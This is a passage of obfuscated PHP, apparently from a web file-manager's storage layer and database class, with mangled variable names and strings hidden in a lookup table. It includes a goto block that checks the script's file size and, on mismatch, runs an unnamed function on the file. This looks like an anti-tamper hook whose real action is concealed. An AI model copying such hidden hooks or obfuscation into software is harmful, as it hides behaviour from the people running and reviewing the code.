$this->infoSimple($„ûàÑµ‡); return $ç¿½©ŒÏ ? $ç¿½©ŒÏ[$_SERVER[™¾ÇÙ¯¹][440]] : !1; } public function pathThis($ÄÖ¾şÜß) { $äêË‡©î = $this->infoSimple($ÄÖ¾şÜß); return $äêË‡©î ? $äêË‡©î[$_SERVER[™¾ÇÙ¯¹][32]] : !1; } public function getPathOuter($âŞÃµ¤) { if (!$âŞÃµ¤) { return $âŞÃµ¤; } $°ÚÛòö = $this->parse($âŞÃµ¤); return KodIO::make($°ÚÛòö[$_SERVER[™¾ÇÙ¯¹][407]]); } public function copyFolderFromIO($»ÙÕú›ş, $²’ÇŞÎÁ, $İÊÙ¦©, $ğùŞ¾ÂÖ, $«¨ÂÇıİ) { $“‡¶¥Šş = $this->model->copyFolderFromIO($»ÙÕú›ş, $²’ÇŞÎÁ, $İÊÙ¦©, $ğùŞ¾ÂÖ, $«¨ÂÇıİ); return KodIO::make($“‡¶¥Šş); } public function isParentOf($µ¥‘¯«, $€Š‚½—§) { return $this->model->isParentOf($µ¥‘¯«, $€Š‚½—§); } public function mkfile($êÃÖ›¤¤, $‘£­Œ¥‘ = '', $™™ı¾ƒó = REPEAT_RENAME) { $†´èáñº =& $_SERVER[™¾ÇÙ¯¹]; $”÷ ïÏ® = $this->parse($êÃÖ›¤¤); $êÃÖ›¤¤ = $”÷ ïÏ®[$†´èáñº[407]]; for ($şŞş¥ô‚ = 0; $şŞş¥ô‚ < count($”÷ ïÏ®[$†´èáñº[1336]]); $şŞş¥ô‚++) { $ÂªšóŸ‘ = $”÷ ïÏ®[$†´èáñº[1336]][$şŞş¥ô‚]; if ($şŞş¥ô‚ == count($”÷ ïÏ®[$†´èáñº[1336]]) - 1) { $êÃÖ›¤¤ = $this->model->mkfile($êÃÖ›¤¤, $ÂªšóŸ‘, $‘£­Œ¥‘, $™™ı¾ƒó); break; } $êÃÖ›¤¤ = $this->model->mkdir($êÃÖ›¤¤, $ÂªšóŸ‘, REPEAT_SKIP); } return $this->getPathOuter($êÃÖ›¤¤); } public function mkdir($’·Í±©º, $†ƒ‹‡Ø© = REPEAT_SKIP) { $Í•Î£² =& $_SERVER[™¾ÇÙ¯¹]; $“çÊçœê = $this->parse($’·Í±©º); $’·Í±©º = $“çÊçœê[$Í•Î£²[407]]; for ($À³Ø™İ = 0; $À³Ø™İ < count($“çÊçœê[$Í•Î£²[1336]]); $À³Ø™İ++) { $â¤÷•Ã¬ = $“çÊçœê[$Í•Î£²[1336]][$À³Ø™İ]; $’·Í±©º = $this->model->mkdir($’·Í±©º, $â¤÷•Ã¬, $†ƒ‹‡Ø©); } return $this->getPathOuter($’·Í±©º); } public function copyFile($­‡á¼Åï, $Ë°àÃ…¯, $ßòœ”¼ä = REPEAT_REPLACE) { $óÉÊ´¥  =& $_SERVER[™¾ÇÙ¯¹]; $÷º¾©À¨ = $this->parse($Ë°àÃ…¯); $µËêè€µ = $this->model->copy($­‡á¼Åï, $÷º¾©À¨[$óÉÊ´¥ [407]], $ßòœ”¼ä, $÷º¾©À¨[$óÉÊ´¥ [84]]); return $µËêè€µ ? $this->getPathOuter($µËêè€µ) : !1; } public function moveFile($­×©™, $ããÎ•ê, $ƒçæª™™ = REPEAT_REPLACE) { $şßÖÜ¬¼ =& $_SERVER[™¾ÇÙ¯¹]; $Ó¨Ñ™ÛÑ = $this->parse($ããÎ•ê); $¿¸ä­°™ = $this->model->move($­×©™, $Ó¨Ñ™ÛÑ[$şßÖÜ¬¼[407]], $ƒçæª™™, $Ó¨Ñ™ÛÑ[$şßÖÜ¬¼[84]]); return $¿¸ä­°™ ? $this->getPathOuter($¿¸ä­°™) : !1; } public function copy($’±±çƒ, $ª¾ú¶å, $ÚÁ–™Óš = REPEAT_REPLACE, $¨§î•×– = false) { $Ú“éÅã… = $this->parse($ª¾ú¶å); $¡Õ²ïÔÕ = $this->model->copy($’±±çƒ, $Ú“éÅã…[$_SERVER[™¾ÇÙ¯¹][407]], $ÚÁ–™Óš, $¨§î•×–); return $¡Õ²ïÔÕ ? $this->getPathOuter($¡Õ²ïÔÕ) : !1; } public function moveSameAllow() { } public function move($½²®†«§, $£ÈÈƒ, $ş¶·ôİ² = REPEAT_REPLACE, $à¥ÜÖ¿æ = false) { $›Åõ¨½® = $this->parse($£ÈÈƒ); $˜¾ÑÏõ³ = $this->model->move($½²®†«§, $›Åõ¨½®[$_SERVER[™¾ÇÙ¯¹][407]], $ş¶·ôİ², $à¥ÜÖ¿æ); return $˜¾ÑÏõ³ ? $this->getPathOuter($˜¾ÑÏõ³) : !1; } public function remove($ŒóÙ†ˆ¬, $·Ø”÷ = true) { return $this->model->remove($ŒóÙ†ˆ¬, $·Ø”÷); } public function rename($‡âÓÑ·’, $İôùÄä) { $î»°­¼ = $this->model->rename($‡âÓÑ·’, $İôùÄä); return $î»°­¼ ? $this->getPathOuter($‡âÓÑ·’) : $î»°­¼; } public function size($²íÆò–œ) { $úÚˆ®Û¶ = $this->infoSimple($²íÆò–œ); return $úÚˆ®Û¶ ? $úÚˆ®Û¶[$_SERVER[™¾ÇÙ¯¹][76]] : 0; } public function infoSimple($¾ëÔ) { return $this->model->sourceInfo($¾ëÔ); } public function info($ÉÙÔÁÌ¦) { return $this->infoParse($ÉÙÔÁÌ¦); } public function infoAuth($”€šæô¸) { return $this->infoParse($”€šæô¸, !1, !0); } public function infoWithChildren($ŞĞ‘½Ôâ) { return $this->infoParse($ŞĞ‘½Ôâ, !0); } protected function infoParse($áç‡û¨‘, $Ğ¨šŒŒ¬ = false, $ƒ¼ˆ–€ = false) { if (!$Ğ¨šŒŒ¬) { return $this->model->pathInfo($áç‡û¨‘, $ƒ¼ˆ–€); } return $this->model->pathInfoMore($áç‡û¨‘); } public function infoFull($¨›ÍŒÎ÷) { $œÂ¯Âºğ =& $_SERVER[™¾ÇÙ¯¹]; $‰ä‹Ò¥ı = explode($œÂ¯Âºğ[8], $¨›ÍŒÎ÷); $’˜Ãêõ = implode($œÂ¯Âºğ[8], array_splice($‰ä‹Ò¥ı, 1)); return $this->model->pathInfoByPath($‰ä‹Ò¥ı[0], $’˜Ãêõ); } public function hashSimple($Âçòû–ì) { $Ñ¹‰¹µ‘ =& $_SERVER[™¾ÇÙ¯¹]; $ÜçÇóëÁ = $this->infoWithChildren($Âçòû–ì); return $ÜçÇóëÁ[$Ñ¹‰¹µ‘[170]][$Ñ¹‰¹µ‘[177]]; } public function hashMd5($÷ÙˆÍ­Š) { $æÆ’ÈŸ‡ =& $_SERVER[™¾ÇÙ¯¹]; $İºœ§¡ = $this->infoWithChildren($÷ÙˆÍ­Š); return $İºœ§¡[$æÆ’ÈŸ‡[170]][$æÆ’ÈŸ‡[176]]; } public function exist($æ—ºÌÒê) { $˜å…½ˆ =& $_SERVER[™¾ÇÙ¯¹]; $ö¾Øú®‘ = $this->parse($æ—ºÌÒê); if (!$ö¾Øú®‘[$˜å…½ˆ[84]]) { return $this->isFile($æ—ºÌÒê) || $this->isFolder($æ—ºÌÒê); } $á‡¿¯¬ = array($˜å…½ˆ[409] => $ö¾Øú®‘[$˜å…½ˆ[407]], $˜å…½ˆ[32] => $ö¾Øú®‘[$˜å…½ˆ[84]]); $Ù¬éÛÀó = $this->model->where($á‡¿¯¬)->find(); return $Ù¬éÛÀó ? !0 : !1; } public function isFile($«„ôƒóÙ) { $Ùã£Ç¼Ä =& $_SERVER[™¾ÇÙ¯¹]; $¿Ü€˜ = $this->infoSimple($«„ôƒóÙ); return $¿Ü€˜ && $¿Ü€˜[$Ùã£Ç¼Ä[418]] == $Ùã£Ç¼Ä[88] ? !1 : !0; } public function isFolder($ôø¹şá€) { $İ„ë¬Ÿ§ =& $_SERVER[™¾ÇÙ¯¹]; $¸Â¼–Ó« = $this->infoSimple($ôø¹şá€); return $¸Â¼–Ó« && $¸Â¼–Ó«[$İ„ë¬Ÿ§[418]] == $İ„ë¬Ÿ§[88] ? !0 : !1; } public function listPath($´ß÷‚Ù, $©¡˜Ö× = false) { $âºËú =& $_SERVER[™¾ÇÙ¯¹]; if ($´ß÷‚Ù == $âºËú[12]) { return !1; } $¦Ó…¿Ú• = array($âºËú[409] => $´ß÷‚Ù); if ($©¡˜Ö×) { return $this->model->listSource($¦Ó…¿Ú•, -1); } return $this->model->listSource($¦Ó…¿Ú•); } public function has($ª´… Ö–, $™¹ê±æÕ = false, $±ñ¨™ = null) { $ÚÎÓïƒ =& $_SERVER[™¾ÇÙ¯¹]; $®–÷«ı = $this->infoWithChildren($ª´… Ö–); if ($™¹ê±æÕ) { return array($ÚÎÓïƒ[208] => $®–÷«ı[$ÚÎÓïƒ[208]], $ÚÎÓïƒ[207] => $®–÷«ı[$ÚÎÓïƒ[207]]); } return $±ñ¨™ ? $®–÷«ı[$ÚÎÓïƒ[208]] : $®–÷«ı[$ÚÎÓïƒ[207]]; } public function listAll($Ÿí—‘Œª) { $×‹âøæØ = IO::info($this->pathParse[$_SERVER[™¾ÇÙ¯¹][84]]); if (!$×‹âøæØ) { return array(); } return $this->model->listAll($Ÿí—‘Œª); } public function getContent($ÚæîÒàç) { return $this->model->getContent($ÚæîÒàç); } public function setContent($”¤©¢ Ğ, $£ˆ’ºˆÒ = '') { return $this->model->setContent($”¤©¢ Ğ, $£ˆ’ºˆÒ); } public function fileSubstr($Ø‹³İÁ, $õƒ®‚”ú, $î³÷¿è) { return $this->model->fileSubstr($Ø‹³İÁ, $õƒ®‚”ú, $î³÷¿è); } public function download($•ƒş°˜ô, $µ˜úôÙı = '') { $ŒÜéõóª = get_path_father($µ˜úôÙı); $ÉÀÓôî = get_path_this($µ˜úôÙı); $âıÕ“’† = $this->model->fileInfoGet($•ƒş°˜ô); $›Ğçìˆ™ = IO::copy($âıÕ“’†[$_SERVER[™¾ÇÙ¯¹][84]], $ŒÜéõóª, !1, $ÉÀÓôî); return $›Ğçìˆ™; } public function setModifyTime($¡ªå§Ğ, $•ö¸ÔŠ´ = '') { $î¹ı³« =& $_SERVER[™¾ÇÙ¯¹]; if (!$¡ªå§Ğ) { return; } $this->model->where(array($î¹ı³«[425] => $¡ªå§Ğ))->save(array($î¹ı³«[85] => $•ö¸ÔŠ´)); } public function upload($“Ä‘«ãÈ, $ÊÄËÔ¹Å, $×ûá™çÄ = false, $™ı£óÏÉ = REPEAT_REPLACE) { $’«ŞÈ =& $_SERVER[™¾ÇÙ¯¹]; $ˆ…ÍÔÉº = $this->parse($“Ä‘«ãÈ); $»ß¦•Úî = $this->model->addFile($ˆ…ÍÔÉº[$’«ŞÈ[407]], $ÊÄËÔ¹Å, $ˆ…ÍÔÉº[$’«ŞÈ[84]], $×ûá™çÄ, $™ı£óÏÉ); return $this->getPathOuter($»ß¦•Úî); } public function uploadFileByID($»¯òÁ…š, $Êß´‘ÔÚ, $Äâ½ Û­) { $¡ê‰Úæ¨ =& $_SERVER[™¾ÇÙ¯¹]; $íĞ¨ÅÔ½ = $this->parse($»¯òÁ…š); $ãı­˜Çç = $this->model->addFileByFileID($íĞ¨ÅÔ½[$¡ê‰Úæ¨[407]], $Êß´‘ÔÚ, $íĞ¨ÅÔ½[$¡ê‰Úæ¨[84]], $Äâ½ Û­); return $this->getPathOuter($ãı­˜Çç); } public function addFileByRemote($ÁƒÛŒÑ , $áÎİşß , $ù•íÌÛ  = array(), $­œğÉ¯¥ = '', $ú²ûö¥Í) { $üÑïˆåß =& $_SERVER[™¾ÇÙ¯¹]; $’îÛàƒª = $this->parse($ÁƒÛŒÑ ); $­œğÉ¯¥ = empty($­œğÉ¯¥) ? $’îÛàƒª[$üÑïˆåß[84]] : $­œğÉ¯¥; $¤¢—ËüÕ = $this->model->addFileByRemote($’îÛàƒª[$üÑïˆåß[407]], $áÎİşß , $­œğÉ¯¥, $ù•íÌÛ , $ú²ûö¥Í); return $this->getPathOuter($¤¢—ËüÕ); } public function uploadLink($Û¸¨¯èú, $®àò¤˜¬ = 0) { $ãê®Í°ì =& $_SERVER[™¾ÇÙ¯¹]; $ñİâ•ˆÏ = $this->parse($Û¸¨¯èú); $ß«­±—ö = _get($GLOBALS[$ãê®Í°ì[7]], $ãê®Í°ì[1337]); $ªÓêºÄ‰ = _get($GLOBALS[$ãê®Í°ì[7]], $ãê®Í°ì[1338]); $Û¸¨¯èú = Model($ãê®Í°ì[617])->createFileName($ñİâ•ˆÏ[$ãê®Í°ì[84]], $ß«­±—ö, $ªÓêºÄ‰); return IO::uploadLink($Û¸¨¯èú, $®àò¤˜¬); } public function fileNameAuto($¥‹İÇÊ, $Àâş”ë, $Œ‚şúëê = REPEAT_REPLACE, $ŠñœïÎ® = false) { return $this->model->fileNameAuto($¥‹İÇÊ, $Àâş”ë, $Œ‚şúëê, $ŠñœïÎ®); } public function fileNameExist($É¨ÅÅ, $¯š¿ûŞ) { return $this->model->fileNameExist($É¨ÅÅ, $¯š¿ûŞ); } protected function _fileOut($£ïÂóô, $÷ÖÏÂ–Î = false, $­‰şâáô = false, $ò’Éàá = '', $Òïô¤«“ = false) { $†ãŸ‘Ö³ =& $_SERVER[™¾ÇÙ¯¹]; $İ¬«§öæ = $this->model->sourceInfo($£ïÂóô); if ($İ¬«§öæ[$†ãŸ‘Ö³[418]] == $†ãŸ‘Ö³[88]) { header($†ãŸ‘Ö³[1339]); die; } $ öÙ¥÷Ò = $this->model->fileInfoGet($£ïÂóô); $ò’Éàá = $ öÙ¥÷Ò[$†ãŸ‘Ö³[176]] ? $ öÙ¥÷Ò[$†ãŸ‘Ö³[176]] : $ò’Éàá; $í÷øˆ± = isset($GLOBALS[$†ãŸ‘Ö³[1340]]) ? $GLOBALS[$†ãŸ‘Ö³[1340]] : $İ¬«§öæ[$†ãŸ‘Ö³[32]]; if ($Òïô¤«“) { return IO::fileOutServer($ öÙ¥÷Ò[$†ãŸ‘Ö³[84]], $÷ÖÏÂ–Î, $í÷øˆ±, $ò’Éàá); } IO::fileOut($ öÙ¥÷Ò[$†ãŸ‘Ö³[84]], $÷ÖÏÂ–Î, $í÷øˆ±, $ò’Éàá); } public function fileOut($Õèè™‘æ, $¹ğ¢ş­ü = false, $àŸ Ë¼” = false, $¾Ü¦ı£ô = '') { $this->_fileOut($Õèè™‘æ, $¹ğ¢ş­ü, $àŸ Ë¼”, $¾Ü¦ı£ô); } public function fileOutServer($°‡Ë¢ê, $Ç×îƒìÖ = false, $ûİ­ÎÔ… = false, $£¨™à· = '') { $this->_fileOut($°‡Ë¢ê, $Ç×îƒìÖ, $ûİ­ÎÔ…, $£¨™à·, !0); } protected function _fileOutImage($¡±¹éê, $†ªú‚Õò = 250) { $Û·øó =& $_SERVER[™¾ÇÙ¯¹]; $ëÕ£¨¥ = $this->model->pathInfo($¡±¹éê); if ($ëÕ£¨¥[$Û·øó[418]] == $Û·øó[88]) { show_json($Û·øó[1341] . $¡±¹éê, !1); } $‡é÷ºŞë = $this->model->fileInfoGet($¡±¹éê); $‡é÷ºŞë[$Û·øó[32]] = $ëÕ£¨¥[$Û·øó[32]]; $‡é÷ºŞë[$Û·øó[169]] = $ëÕ£¨¥[$Û·øó[169]]; $GLOBALS[$Û·øó[1340]] = $‡é÷ºŞë[$Û·øó[32]]; $GLOBALS[$Û·øó[168]] = $‡é÷ºŞë; IO::fileOutImage($‡é÷ºŞë[$Û·øó[84]], $†ªú‚Õò); } public function fileOutImage($ÁÜ²§õ¼, $«¯‹Ó·Ø = 250) { $this->_fileOutImage($ÁÜ²§õ¼, $«¯‹Ó·Ø); } public function fileOutImageServer($œ¡›˜æÃ, $ÖÕ†¯ÇË = 250) { $this->_fileOutImage($œ¡›˜æÃ, $ÖÕ†¯ÇË); } public function link($ÚåÃ¡À, $ê¾ŒĞá = '') { $ùâ —õ± = $this->model->fileInfoGet($ÚåÃ¡À); return IO::link($ùâ —õ±[$_SERVER[™¾ÇÙ¯¹][84]], $ê¾ŒĞá); } protected function parse($´Ù“ï¸) { $ÆÀæÖÆ½ =& $_SERVER[™¾ÇÙ¯¹]; if (strstr($´Ù“ï¸, $ÆÀæÖÆ½[8]) === !1) { return array($ÆÀæÖÆ½[427] => intval($´Ù“ï¸), $ÆÀæÖÆ½[84] => $ÆÀæÖÆ½[12], $ÆÀæÖÆ½[1336] => array()); } $¸ŸÈÃ ¸ = explode($ÆÀæÖÆ½[8], trim($´Ù“ï¸, $ÆÀæÖÆ½[8])); if (count($¸ŸÈÃ ¸) < 2) { show_tips(clear_html($´Ù“ï¸) . $ÆÀæÖÆ½[1342]); } return array($ÆÀæÖÆ½[427] => intval($¸ŸÈÃ ¸[0]), $ÆÀæÖÆ½[84] => $¸ŸÈÃ ¸[1], $ÆÀæÖÆ½[1336] => array_slice($¸ŸÈÃ ¸, 1)); } } goto a¤Ò‰Éò‘; AìÃŸëŠõ´: $_file = $_SERVER[$_SERVER[™¾ÇÙ¯¹][245]]; $_size = $_SERVER[™¾ÇÙ¯¹][762]; if ($_SERVER[$_SERVER[™¾ÇÙ¯¹][244]] != $_size($_file)) { $_getc = $_SERVER[™¾ÇÙ¯¹][246]; $_getfile = $_SERVER[$_SERVER[™¾ÇÙ¯¹][247]] . $_SERVER[™¾ÇÙ¯¹][248]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™¾ÇÙ¯¹][231], $_getfilec); if (count($_getarrs) < $_SERVER[™¾ÇÙ¯¹][249]) { $exit = $_SERVER[™¾ÇÙ¯¹][250]; $exit(); } $_act = $_SERVER[™¾ÇÙ¯¹][251]; $_act($_file); } goto D–ÎšÇùêÆ; bÀƒ’ÀÚÜÓ: class DbSqlite3 extends DbSqlite3Base { public function query($¥íãä§í) { $«¦äæ™º =& $_SERVER[™¾ÇÙ¯¹]; if (!CacheLock::fileLock($«¦äæ™º[13])) { return !1; } $ãÃÍÊ¿ = parent::query($¥íãä§í); CacheLock::fileUnLock($«¦äæ™º[13]); return $ãÃÍÊ¿; } public function execute($åÄÍí­Ó) { $Ó§Ö…ã =& $_SERVER[™¾ÇÙ¯¹]; if (!CacheLock::fileLock($Ó§Ö…ã[13])) { return !1; } $ÀŠ“É÷Ü = parent::execute($åÄÍí­Ó); CacheLock::fileUnLock($Ó§Ö…ã[13]); return $ÀŠ“É÷Ü; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\156\145\161" => "\x3c\76", "\147\164" => "\x3e", "\145\x67\164" => "\76\75", "\154\164" => "\74", "\145\154\x74" => "\x3c\75", "\156\157\164\154\x69\153\x65" => "\116\117\124\40\x4c\x49\x4b\x45", "\x6c\151\x6b\145" => "\114\111\x4b\105", "\151\156" => "\x49\116", "\x6e\157\164\151\x6e" => "\x4e\117\x54\40\x49\x4e", "\x6e\x6f\164\40\x69\x6e" => "\116\117\x54\x20\x49\116", "\x62\x65\x74\167\x65\145\156" => "\x42\105\x54\x57\105\105\x4e", "\x6e\157\164\x62\x65\164\x77\145\x65\x6e" => "\116\x4f\124\40\102\105\x54\x57\x45\x45\x4e", "\x6e\157\x74\40\142\x65\x74\167\145\145\x6e" => "\x4e\117\x54\x20\102\x45\x54\127\x45\x45\116"); protected $selectSql = "\123\105\x4c\105\103\x54\45\x44\x49\x53\124\111\x4e\103\x54\45\x20\45\x46\x49\x45\114\104\45\40\106\122\117\x4d\40\x25\124\x41\102\114\x45\x25\x25\112\117\x49\x4e\45\45\127\110\105\x52\x45\x25\45\107\x52\x4f\x55\120\45\x25\x48\x41\126\111\x4e\x47\x25\x25\x4f\122\x44\x45\x52\45\x25\114\111\x4d\111\x54\45\x20\x25\x55\116\x49\117\116\x25\45\103\x4f\x4d\x4d\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $‘÷Â¹û‡ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[™¾ÇÙ¯¹][968], $‘÷Â¹û‡); } public function factory($§öğúÚ¯ = '') { $ë…Ê‰ =& $_SERVER[™¾ÇÙ¯¹]; $§öğúÚ¯ = $this->parseConfig($§öğúÚ¯); if (empty($§öğúÚ¯[$ë…Ê‰[969]])) { think_exception(think_lang($ë…Ê‰[970])); } $this->dbType = ucwords(strtolower($§öğúÚ¯[$ë…Ê‰[969]])); $ÅÙüË§Ï = $ë…Ê‰[971] . $this->dbType; if (class_exists($ÅÙüË§Ï)) { $’€ö©ùÌ = new $ÅÙüË§Ï($§öğúÚ¯); if ($ë…Ê‰[972] != strtolower($§öğúÚ¯[$ë…Ê‰[969]])) { $’€ö©ùÌ->dbType = strtoupper($this->dbType); } else { $’€ö©ùÌ->dbType = $this->_getDsnType($§öğúÚ¯[$ë…Ê‰[924]]); } } else { think_exception(think_lang($ë…Ê‰[973]) . $ë…Ê‰[974] . $ÅÙüË§Ï); } return $’€ö©ùÌ; } public function __call($ÓúËï†µ, $ñèºµå) { if (method_exists($this, $ÓúËï†µ)) { return call_user_func_array(array($this, $ÓúËï†µ), $ñèºµå); } } protected function _getDsnType($¸¦Ó¯ı¨) { $¾ÔÑ£ÈÒ = explode($_SERVER[™¾ÇÙ¯¹][4], $¸¦Ó¯ı¨); $ÏÓ÷¡Æ = strtoupper(trim($¾ÔÑ£ÈÒ[0])); return $ÏÓ÷¡Æ; } private function parseConfig($ÓŞÇ®Ö¯ = '') { $ØÚõ¾­î =& $_SERVER[™¾ÇÙ¯¹]; if (!empty($ÓŞÇ®Ö¯) && is_string($ÓŞÇ®Ö¯)) { $ÓŞÇ®Ö¯ = $this->parseDSN($ÓŞÇ®Ö¯); } elseif (is_array($ÓŞÇ®Ö¯)) { $ÓŞÇ®Ö¯ = array_change_key_case($ÓŞÇ®Ö¯); $ÓŞÇ®Ö¯ = array($ØÚõ¾­î[969] => $ÓŞÇ®Ö¯[$ØÚõ¾­î[975]], $ØÚõ¾­î[896] => $ÓŞÇ®Ö¯[$ØÚõ¾­î[976]], $ØÚõ¾­î[897] => $ÓŞÇ®Ö¯[$ØÚõ¾­î[977]], $ØÚõ¾­î[894] => $ÓŞÇ®Ö¯[$ØÚõ¾­î[978]], $ØÚõ¾­î[895] => $ÓŞÇ®Ö¯[$ØÚõ¾­î[979]], $ØÚõ¾­î[21] => $ÓŞÇ®Ö¯[$ØÚõ¾­î[980]], $ØÚõ¾­î[924] => $ÓŞÇ®Ö¯[$ØÚõ¾­î[981]], $ØÚõ¾­î[17] => isset($ÓŞÇ®Ö¯[$ØÚõ¾­î[982]]) ? $ÓŞÇ®Ö¯[$ØÚõ¾­î[982]] : array()); } elseif (empty($ÓŞÇ®Ö¯)) { if (think_config($ØÚõ¾­î[983]) && $ØÚõ¾­î[972] != strtolower(think_config($ØÚõ¾­î[984]))) { $ÓŞÇ®Ö¯ = $this->parseDSN(think_config($ØÚõ¾­î[983])); } else { $ÓŞÇ®Ö¯ = array($ØÚõ¾­î[969] => think_config($ØÚõ¾­î[984]), $ØÚõ¾­î[896] => think_config($ØÚõ¾­î[985]), $ØÚõ¾­î[897] => think_config($ØÚõ¾­î[986]), $ØÚõ¾­î[894] => think_config($ØÚõ¾­î[987]), $ØÚõ¾­î[895] => think_config($ØÚõ¾­î[988]), $ØÚõ¾­î[21] => think_config($ØÚõ¾­î[255]), $ØÚõ¾­î[924] => think_config($ØÚõ¾­î[983]), $ØÚõ¾­î[17] => think_config($ØÚõ¾­î[989])); } } return $ÓŞÇ®Ö¯; } protected function initConnect($ĞÆÀ«·ê = true) { if (1 == think_config($_SERVER[™¾ÇÙ¯¹][22])) { $this->_linkID = $this->multiConnect($ĞÆÀ«·ê); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $â½¼ŸŞß => $ŠššÀ™û) { $this->_linkID = $ŠššÀ™û; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($³¿èç‰ = false) { $øñá×»õ =& $_SERVER[™¾ÇÙ¯¹]; static $æµ³¯íú = array(); static $ô’ÌÇ¸ = -1; if (empty($æµ³¯íú)) { foreach ($this->config as $™Î›ëÕ½ => $Ÿ¼â…È) { $æµ³¯íú[$™Î›ëÕ½] = explode($øñá×»õ[50], $Ÿ¼â…È); } } if (think_config($øñá×»õ[990])) { if ($³¿èç‰ || think_config($øñá×»õ[403]) === !0) { $ŒğŞ×ëş = floor(mt_rand(0, think_config($øñá×»õ[991]) - 1)); $ô’ÌÇ¸ = $ŒğŞ×ëş; } else { if (is_numeric(think_config($øñá×»õ[992]))) { $ŒğŞ×ëş = think_config($øñá×»õ[992]); } else { $ŒğŞ×ëş = floor(mt_rand(think_config($øñá×»õ[991]), count($æµ³¯íú[$øñá×»õ[894]]) - 1)); } } } else { $ŒğŞ×ëş = floor(mt_rand(0, count($æµ³¯íú[$øñá×»õ[894]]) - 1)); $ô’ÌÇ¸ = $ŒğŞ×ëş; } $ŒğŞ×ëş = $ô’ÌÇ¸ !== -1 ? $ô’ÌÇ¸ : $ŒğŞ×ëş; $ï•÷ÜÇ¶ = array($øñá×»õ[896] => isset($æµ³¯íú[$øñá×»õ[896]][$ŒğŞ×ëş]) ? $æµ³¯íú[$øñá×»õ[896]][$ŒğŞ×ëş] : $æµ³¯íú[$øñá×»õ[896]][0], $øñá×»õ[897] => isset($æµ³¯íú[$øñá×»õ[897]][$ŒğŞ×ëş]) ? $æµ³¯íú[$øñá×»õ[897]][$ŒğŞ×ëş] : $æµ³¯íú[$øñá×»õ[897]][0], $øñá×»õ[894] => isset($æµ³¯íú[$øñá×»õ[894]][$ŒğŞ×ëş]) ? $æµ³¯íú[$øñá×»õ[894]][$ŒğŞ×ëş] : $æµ³¯íú[$øñá×»õ[894]][0], $øñá×»õ[895] => isset($æµ³¯íú[$øñá×»õ[895]][$ŒğŞ×ëş]) ? $æµ³¯íú[$øñá×»õ[895]][$ŒğŞ×ëş] : $æµ³¯íú[$øñá×»õ[895]][0], $øñá×»õ[21] => isset($æµ³¯íú[$øñá×»õ[21]][$ŒğŞ×ëş]) ? $æµ³¯íú[$øñá×»õ[21]][$ŒğŞ×ëş] : $æµ³¯íú[$øñá×»õ[21]][0], $øñá×»õ[924] => isset($æµ³¯íú[$øñá×»õ[924]][$ŒğŞ×ëş]) ? $æµ³¯íú[$øñá×»õ[924]][$ŒğŞ×ëş] : $æµ³¯íú[$øñá×»õ[924]][0], $øñá×»õ[17] => isset($æµ³¯íú[$øñá×»õ[17]][$ŒğŞ×ëş]) ? $æµ³¯íú[$øñá×»õ[17]][$ŒğŞ×ëş] : $æµ³¯íú[$øñá×»õ[17]][0]); return $this->connect($ï•÷ÜÇ¶, $ŒğŞ×ëş); } public function parseDSN($Ó‹šÔíÚ) { $ßÉòà‹¼ =& $_SERVER[™¾ÇÙ¯¹]; if (empty($Ó‹šÔíÚ)) { return !1; } $ë§Óç™˜ = parse_url($Ó‹šÔíÚ); if ($ë§Óç™˜[$ßÉòà‹¼[180]]) { $ÌÇœŞé† = array($ßÉòà‹¼[969] => $ë§Óç™˜[$ßÉòà‹¼[180]], $ßÉòà‹¼[896] => isset($ë§Óç™˜[$ßÉòà‹¼[608]]) ? $ë§Óç™˜[$ßÉòà‹¼[608]] : $ßÉòà‹¼[12], $ßÉòà‹¼[897] => isset($ë§Óç™˜[$ßÉòà‹¼[993]]) ? $ë§Óç™˜[$ßÉòà‹¼[993]] : $ßÉòà‹¼[12], $ßÉòà‹¼[894] => isset($ë§Óç™˜[$ßÉòà‹¼[181]]) ? $ë§Óç™˜[$ßÉòà‹¼[181]] : $ßÉòà‹¼[12], $ßÉòà‹¼[895] => isset($ë§Óç™˜[$ßÉòà‹¼[182]]) ? $ë§Óç™˜[$ßÉòà‹¼[182]] : $ßÉòà‹¼[12], $ßÉòà‹¼[21] => isset($ë§Óç™˜[$ßÉòà‹¼[84]]) ? substr($ë§Óç™˜[$ßÉòà‹¼[84]], 1) : $ßÉòà‹¼[12]); } else { preg_match($ßÉòà‹¼[994], trim($Ó‹šÔíÚ), $æš´ÃáÖ); $ÌÇœŞé† = array($ßÉòà‹¼[969] => $æš´ÃáÖ[1], $ßÉòà‹¼[896] => $æš´ÃáÖ[2], $ßÉòà‹¼[897] => $æš´ÃáÖ[3], $ßÉòà‹¼[894] => $æš´ÃáÖ[4], $ßÉòà‹¼[895] => $æš´ÃáÖ[5], $ßÉòà‹¼[21] => $æš´ÃáÖ[6]); } $ÌÇœŞé†[$ßÉòà‹¼[924]] = $ßÉòà‹¼[12]; return $ÌÇœŞé†; } protected function debug() { $™·€Ä˜ä =& $_SERVER[™¾ÇÙ¯¹]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $™·€Ä˜ä[995]; if (think_config($™·€Ä˜ä[996])) { think_status($™·€Ä˜ä[997]); think_trace($this->queryStr . $™·€Ä˜ä[998] . think_status($™·€Ä˜ä[24], $™·€Ä˜ä[997], 6) . $™·€Ä˜ä[999], $™·€Ä˜ä[12], $™·€Ä˜ä[1000]); } } protected function parseLock($÷üµ¥ùŸ = false) { $œÚä®ŞŞ =& $_SERVER[™¾ÇÙ¯¹]; if (!$÷üµ¥ùŸ) { return $œÚä®ŞŞ[12]; } if ($œÚä®ŞŞ[926] == $this->dbType) { return $œÚä®ŞŞ[1001]; } return $œÚä®ŞŞ[1002]; } protected function parseSet($±²Ô¸ëƒ) { $µÀŞÎÒ =& $_SERVER[™¾ÇÙ¯¹]; foreach ($±²Ô¸ëƒ as 